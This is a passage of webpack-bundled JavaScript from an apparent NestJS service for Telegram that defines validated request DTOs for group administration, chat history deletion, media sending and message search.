    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsInt)(),
    __metadata("design:type", Number)
], DeleteHistoryDto.prototype, "maxId", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'If true, clears the history only for the current user without deleting for others',
        default: true,
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], DeleteHistoryDto.prototype, "justClear", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'If true, deletes the message history for all participants (if permitted)',
        default: false,
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], DeleteHistoryDto.prototype, "revoke", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Minimum date (UNIX timestamp) for messages to be deleted',
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsInt)(),
    __metadata("design:type", Number)
], DeleteHistoryDto.prototype, "minDate", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Maximum date (UNIX timestamp) for messages to be deleted',
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsInt)(),
    __metadata("design:type", Number)
], DeleteHistoryDto.prototype, "maxDate", void 0);


/***/ }),

/***/ "./src/components/Telegram/dto/group-operations.dto.ts":
/*!*************************************************************!*\
  !*** ./src/components/Telegram/dto/group-operations.dto.ts ***!
  \*************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.createGroupDto = exports.ChatCleanupDto = exports.GroupSettingsDto = exports.AdminOperationDto = exports.GroupMemberOperationDto = exports.BaseGroupOperationDto = exports.AdminPermissionsDto = exports.AdminPermission = void 0;
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_transformer_1 = __webpack_require__(/*! class-transformer */ "class-transformer");
var AdminPermission;
(function (AdminPermission) {
    AdminPermission["CHANGE_INFO"] = "changeInfo";
    AdminPermission["POST_MESSAGES"] = "postMessages";
    AdminPermission["EDIT_MESSAGES"] = "editMessages";
    AdminPermission["DELETE_MESSAGES"] = "deleteMessages";
    AdminPermission["BAN_USERS"] = "banUsers";
    AdminPermission["INVITE_USERS"] = "inviteUsers";
    AdminPermission["PIN_MESSAGES"] = "pinMessages";
    AdminPermission["ADD_ADMINS"] = "addAdmins";
    AdminPermission["ANONYMOUS"] = "anonymous";
    AdminPermission["MANAGE_CALL"] = "manageCall";
})(AdminPermission || (exports.AdminPermission = AdminPermission = {}));
class AdminPermissionsDto {
    constructor() {
        this.changeInfo = true;
        this.postMessages = true;
        this.editMessages = true;
        this.deleteMessages = true;
        this.banUsers = true;
        this.inviteUsers = true;
        this.pinMessages = true;
        this.addAdmins = false;
        this.anonymous = false;
        this.manageCall = true;
    }
}
exports.AdminPermissionsDto = AdminPermissionsDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Permission to change group info', default: true }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], AdminPermissionsDto.prototype, "changeInfo", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Permission to post messages', default: true }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], AdminPermissionsDto.prototype, "postMessages", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Permission to edit messages', default: true }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], AdminPermissionsDto.prototype, "editMessages", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Permission to delete messages', default: true }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], AdminPermissionsDto.prototype, "deleteMessages", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Permission to ban users', default: true }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], AdminPermissionsDto.prototype, "banUsers", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Permission to invite users', default: true }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], AdminPermissionsDto.prototype, "inviteUsers", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Permission to pin messages', default: true }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], AdminPermissionsDto.prototype, "pinMessages", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Permission to add new admins', default: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], AdminPermissionsDto.prototype, "addAdmins", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Permission to remain anonymous', default: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], AdminPermissionsDto.prototype, "anonymous", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Permission to manage voice chats', default: true }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], AdminPermissionsDto.prototype, "manageCall", void 0);
class BaseGroupOperationDto {
}
exports.BaseGroupOperationDto = BaseGroupOperationDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Group ID' }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsNotEmpty)(),
    __metadata("design:type", String)
], BaseGroupOperationDto.prototype, "groupId", void 0);
class GroupMemberOperationDto extends BaseGroupOperationDto {
}
exports.GroupMemberOperationDto = GroupMemberOperationDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Array of user IDs', type: [String] }),
    (0, class_validator_1.IsString)({ each: true }),
    __metadata("design:type", Array)
], GroupMemberOperationDto.prototype, "members", void 0);
class AdminOperationDto extends BaseGroupOperationDto {
}
exports.AdminOperationDto = AdminOperationDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'User ID to promote/demote' }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsNotEmpty)(),
    __metadata("design:type", String)
], AdminOperationDto.prototype, "userId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Whether to promote or demote', required: true }),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], AdminOperationDto.prototype, "isPromote", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Admin permissions', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.ValidateNested)(),
    (0, class_transformer_1.Type)(() => AdminPermissionsDto),
    __metadata("design:type", AdminPermissionsDto)
], AdminOperationDto.prototype, "permissions", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Custom admin rank/title', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], AdminOperationDto.prototype, "rank", void 0);
class GroupSettingsDto extends BaseGroupOperationDto {
    constructor() {
        super(...arguments);
        this.megagroup = true;
        this.forImport = false;
    }
}
exports.GroupSettingsDto = GroupSettingsDto;
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Group title', required: false }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", String)
], GroupSettingsDto.prototype, "title", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Group username', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], GroupSettingsDto.prototype, "username", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Group description', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], GroupSettingsDto.prototype, "description", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Address or location of the group', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], GroupSettingsDto.prototype, "address", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Slow mode delay in seconds', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], GroupSettingsDto.prototype, "slowMode", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Whether the group is a megagroup', default: true }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], GroupSettingsDto.prototype, "megagroup", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Whether the group is for import', default: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], GroupSettingsDto.prototype, "forImport", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Member restrictions', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsObject)(),
    __metadata("design:type", Object)
], GroupSettingsDto.prototype, "memberRestrictions", void 0);
class ChatCleanupDto extends BaseGroupOperationDto {
}
exports.ChatCleanupDto = ChatCleanupDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Chat ID to clean up' }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsNotEmpty)(),
    __metadata("design:type", String)
], ChatCleanupDto.prototype, "chatId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Delete messages before this date', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsDateString)(),
    (0, class_transformer_1.Transform)(({ value }) => value ? new Date(value) : undefined),
    __metadata("design:type", Date)
], ChatCleanupDto.prototype, "beforeDate", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Only delete media messages', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], ChatCleanupDto.prototype, "onlyMedia", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Exclude pinned messages', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], ChatCleanupDto.prototype, "excludePinned", void 0);
class createGroupDto {
    constructor() {
        this.slowMode = 0;
        this.megagroup = true;
        this.broadcast = true;
        this.forImport = false;
    }
}
exports.createGroupDto = createGroupDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Group title', required: true }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsNotEmpty)(),
    __metadata("design:type", String)
], createGroupDto.prototype, "title", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Group description', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], createGroupDto.prototype, "about", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Address or location of the group', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], createGroupDto.prototype, "address", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Slow mode delay in seconds', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], createGroupDto.prototype, "slowMode", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Whether the group is a megagroup', default: true }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], createGroupDto.prototype, "megagroup", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Whether the group is a broadcast', default: true }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], createGroupDto.prototype, "broadcast", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Whether the group is for import', default: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    __metadata("design:type", Boolean)
], createGroupDto.prototype, "forImport", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Member restrictions', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsObject)(),
    __metadata("design:type", Object)
], createGroupDto.prototype, "memberRestrictions", void 0);


/***/ }),

/***/ "./src/components/Telegram/dto/index.ts":
/*!**********************************************!*\
  !*** ./src/components/Telegram/dto/index.ts ***!
  \**********************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __exportStar = (this && this.__exportStar) || function(m, exports) {
    for (var p in m) if (p !== "default" && !Object.prototype.hasOwnProperty.call(exports, p)) __createBinding(exports, m, p);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.AdminPermission = exports.MediaType = exports.BatchOperationType = void 0;
__exportStar(__webpack_require__(/*! ../../../interfaces/telegram */ "./src/interfaces/telegram.ts"), exports);
__exportStar(__webpack_require__(/*! ./batch-operations.dto */ "./src/components/Telegram/dto/batch-operations.dto.ts"), exports);
__exportStar(__webpack_require__(/*! ./media-operations.dto */ "./src/components/Telegram/dto/media-operations.dto.ts"), exports);
__exportStar(__webpack_require__(/*! ./schedule-operations.dto */ "./src/components/Telegram/dto/schedule-operations.dto.ts"), exports);
__exportStar(__webpack_require__(/*! ./metadata-operations.dto */ "./src/components/Telegram/dto/metadata-operations.dto.ts"), exports);
__exportStar(__webpack_require__(/*! ./group-operations.dto */ "./src/components/Telegram/dto/group-operations.dto.ts"), exports);
__exportStar(__webpack_require__(/*! ./contact-management.dto */ "./src/components/Telegram/dto/contact-management.dto.ts"), exports);
__exportStar(__webpack_require__(/*! ./profile-settings.dto */ "./src/components/Telegram/dto/profile-settings.dto.ts"), exports);
__exportStar(__webpack_require__(/*! ./view-once-media.dto */ "./src/components/Telegram/dto/view-once-media.dto.ts"), exports);
__exportStar(__webpack_require__(/*! ./create-bot.dto */ "./src/components/Telegram/dto/create-bot.dto.ts"), exports);
var batch_operations_dto_1 = __webpack_require__(/*! ./batch-operations.dto */ "./src/components/Telegram/dto/batch-operations.dto.ts");
Object.defineProperty(exports, "BatchOperationType", ({ enumerable: true, get: function () { return batch_operations_dto_1.BatchOperationType; } }));
var media_operations_dto_1 = __webpack_require__(/*! ./media-operations.dto */ "./src/components/Telegram/dto/media-operations.dto.ts");
Object.defineProperty(exports, "MediaType", ({ enumerable: true, get: function () { return media_operations_dto_1.MediaType; } }));
var group_operations_dto_1 = __webpack_require__(/*! ./group-operations.dto */ "./src/components/Telegram/dto/group-operations.dto.ts");
Object.defineProperty(exports, "AdminPermission", ({ enumerable: true, get: function () { return group_operations_dto_1.AdminPermission; } }));


/***/ }),

/***/ "./src/components/Telegram/dto/media-operations.dto.ts":
/*!*************************************************************!*\
  !*** ./src/components/Telegram/dto/media-operations.dto.ts ***!
  \*************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.VoiceMessageDto = exports.SendMediaAlbumDto = exports.MediaAlbumItemDto = exports.SendMediaDto = exports.MediaFilterDto = exports.MediaSearchDto = exports.BaseMediaOperationDto = exports.MediaType = void 0;
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_transformer_1 = __webpack_require__(/*! class-transformer */ "class-transformer");
var MediaType;
(function (MediaType) {
    MediaType["PHOTO"] = "photo";
    MediaType["VIDEO"] = "video";
    MediaType["DOCUMENT"] = "document";
    MediaType["VOICE"] = "voice";
    MediaType["AUDIO"] = "audio";
})(MediaType || (exports.MediaType = MediaType = {}));
class BaseMediaOperationDto {
}
exports.BaseMediaOperationDto = BaseMediaOperationDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Chat ID for media operation' }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], BaseMediaOperationDto.prototype, "chatId", void 0);
class MediaSearchDto extends BaseMediaOperationDto {
    constructor() {
        super(...arguments);
        this.limit = 50;
    }
}
exports.MediaSearchDto = MediaSearchDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Media types to include', enum: MediaType, isArray: true }),
    (0, class_validator_1.IsArray)(),
    (0, class_validator_1.IsEnum)(MediaType, { each: true }),
    __metadata("design:type", Array)
], MediaSearchDto.prototype, "types", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Message offset', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    (0, class_transformer_1.Transform)(({ value }) => parseInt(value)),
    __metadata("design:type", Number)
], MediaSearchDto.prototype, "offset", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Items per page', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    (0, class_transformer_1.Transform)(({ value }) => parseInt(value)),
    __metadata("design:type", Number)
], MediaSearchDto.prototype, "limit", void 0);
class MediaFilterDto extends MediaSearchDto {
}
exports.MediaFilterDto = MediaFilterDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Start date for filtering', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    (0, class_transformer_1.Transform)(({ value }) => value ? new Date(value).toISOString() : undefined),
    __metadata("design:type", String)
], MediaFilterDto.prototype, "startDate", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'End date for filtering', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    (0, class_transformer_1.Transform)(({ value }) => value ? new Date(value).toISOString() : undefined),
    __metadata("design:type", String)
], MediaFilterDto.prototype, "endDate", void 0);
class SendMediaDto extends BaseMediaOperationDto {
}
exports.SendMediaDto = SendMediaDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'URL of the media file' }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsUrl)(),
    __metadata("design:type", String)
], SendMediaDto.prototype, "url", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Caption for the media', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SendMediaDto.prototype, "caption", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Filename for the media' }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SendMediaDto.prototype, "filename", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Type of media', enum: MediaType }),
    (0, class_validator_1.IsEnum)(MediaType),
    __metadata("design:type", String)
], SendMediaDto.prototype, "type", void 0);
class MediaAlbumItemDto {
}
exports.MediaAlbumItemDto = MediaAlbumItemDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'URL of the media file' }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsUrl)(),
    __metadata("design:type", String)
], MediaAlbumItemDto.prototype, "url", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Type of media', enum: MediaType }),
    (0, class_validator_1.IsEnum)(MediaType),
    __metadata("design:type", String)
], MediaAlbumItemDto.prototype, "type", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Caption for the media item', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], MediaAlbumItemDto.prototype, "caption", void 0);
class SendMediaAlbumDto extends BaseMediaOperationDto {
}
exports.SendMediaAlbumDto = SendMediaAlbumDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Array of media items', type: [MediaAlbumItemDto] }),
    (0, class_validator_1.IsArray)(),
    (0, class_validator_1.ValidateNested)({ each: true }),
    (0, class_transformer_1.Type)(() => MediaAlbumItemDto),
    __metadata("design:type", Array)
], SendMediaAlbumDto.prototype, "media", void 0);
class VoiceMessageDto extends BaseMediaOperationDto {
}
exports.VoiceMessageDto = VoiceMessageDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'URL of the voice message file' }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsUrl)(),
    __metadata("design:type", String)
], VoiceMessageDto.prototype, "url", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Duration of voice message in seconds', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], VoiceMessageDto.prototype, "duration", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Caption for the voice message', required: false }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], VoiceMessageDto.prototype, "caption", void 0);


/***/ }),

/***/ "./src/components/Telegram/dto/message-search.dto.ts":
/*!***********************************************************!*\
  !*** ./src/components/Telegram/dto/message-search.dto.ts ***!
  \***********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.SearchMessagesResponseDto = exports.MessageTypeResult = exports.SearchMessagesDto = exports.SearchScope = exports.MessageMediaType = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_transformer_1 = __webpack_require__(/*! class-transformer */ "class-transformer");
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
var MessageMediaType;
(function (MessageMediaType) {
    MessageMediaType["ALL"] = "all";
    MessageMediaType["TEXT"] = "text";
    MessageMediaType["PHOTO"] = "photo";
    MessageMediaType["VIDEO"] = "video";
    MessageMediaType["VOICE"] = "voice";
    MessageMediaType["DOCUMENT"] = "document";
    MessageMediaType["ROUND_VIDEO"] = "roundVideo";
    MessageMediaType["ROUND_VOICE"] = "roundVoice";
    MessageMediaType["STICKER"] = "sticker";
    MessageMediaType["ANIMATION"] = "animation";
    MessageMediaType["CONTACT"] = "contact";
    MessageMediaType["MUSIC"] = "music";
    MessageMediaType["CHAT_PHOTO"] = "chatPhoto";
})(MessageMediaType || (exports.MessageMediaType = MessageMediaType = {}));
var SearchScope;
(function (SearchScope) {
    SearchScope["CHAT"] = "chat";
    SearchScope["GLOBAL"] = "global";
})(SearchScope || (exports.SearchScope = SearchScope = {}));
class SearchMessagesDto {
}
exports.SearchMessagesDto = SearchMessagesDto;
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Chat ID to search in (required for chat-specific search)',
    }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", String)
], SearchMessagesDto.prototype, "chatId", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Search query string',
    }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", String)
], SearchMessagesDto.prototype, "query", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Filter by multiple types options',
        isArray: true,
        enum: MessageMediaType,
        example: [MessageMediaType.TEXT, MessageMediaType.PHOTO],
        default: [MessageMediaType.ALL, MessageMediaType.TEXT, MessageMediaType.PHOTO, MessageMediaType.VIDEO, MessageMediaType.VOICE, MessageMediaType.DOCUMENT, MessageMediaType.ROUND_VIDEO, MessageMediaType.ROUND_VOICE, MessageMediaType.STICKER, MessageMediaType.ANIMATION, MessageMediaType.CONTACT, MessageMediaType.MUSIC, MessageMediaType.CHAT_PHOTO],
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsArray)(),
    (0, class_validator_1.IsEnum)(MessageMediaType, { each: true }),
    (0, class_transformer_1.Type)(() => String),
    __metadata("design:type", Array)
], SearchMessagesDto.prototype, "types", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Minimum message ID for filtering',
    }),
    (0, class_validator_1.IsInt)(),
    (0, class_validator_1.Min)(0),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Number)
], SearchMessagesDto.prototype, "minId", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Maximum message ID for filtering',
    }),
    (0, class_validator_1.IsInt)(),
    (0, class_validator_1.Min)(0),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Number)
], SearchMessagesDto.prototype, "maxId", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Maximum number of messages to retrieve',
        minimum: 1,
        maximum: 500,
    }),
    (0, class_validator_1.IsInt)(),
    (0, class_validator_1.Min)(1),
    (0, class_validator_1.Max)(500),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Number)
], SearchMessagesDto.prototype, "limit", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Offset ID for pagination',
    }),
    (0, class_validator_1.IsInt)(),
    (0, class_validator_1.Min)(0),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Number)
], SearchMessagesDto.prototype, "offsetId", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Offset date as Unix timestamp',
    }),
    (0, class_validator_1.IsInt)(),
    (0, class_validator_1.Min)(0),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Number)
], SearchMessagesDto.prototype, "offsetDate", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Start date for filtering messages by date range',
    }),
    (0, class_transformer_1.Type)(() => Date),
    (0, class_validator_1.IsDate)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Date)
], SearchMessagesDto.prototype, "startDate", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'End date for filtering messages by date range',
    }),
    (0, class_transformer_1.Type)(() => Date),
    (0, class_validator_1.IsDate)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Date)
], SearchMessagesDto.prototype, "endDate", void 0);
class MessageTypeResult {
}
exports.MessageTypeResult = MessageTypeResult;
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Array of message IDs matching the search criteria',
        type: [Number],
        example: [1001, 1005, 1010]
    }),
    (0, class_validator_1.IsArray)(),
    (0, class_validator_1.IsInt)({ each: true }),
    __metadata("design:type", Array)
], MessageTypeResult.prototype, "messages", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Total count of messages matching the search criteria',
        example: 3
    }),
    (0, class_validator_1.IsInt)(),
    (0, class_validator_1.Min)(0),
    __metadata("design:type", Number)
], MessageTypeResult.prototype, "total", void 0);
class SearchMessagesResponseDto {
}
exports.SearchMessagesResponseDto = SearchMessagesResponseDto;
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'All message results',
        type: MessageTypeResult
    }),
    (0, class_validator_1.ValidateNested)(),
    (0, class_transformer_1.Type)(() => MessageTypeResult),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", MessageTypeResult)
], SearchMessagesResponseDto.prototype, "all", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Text message results',
        type: MessageTypeResult
    }),
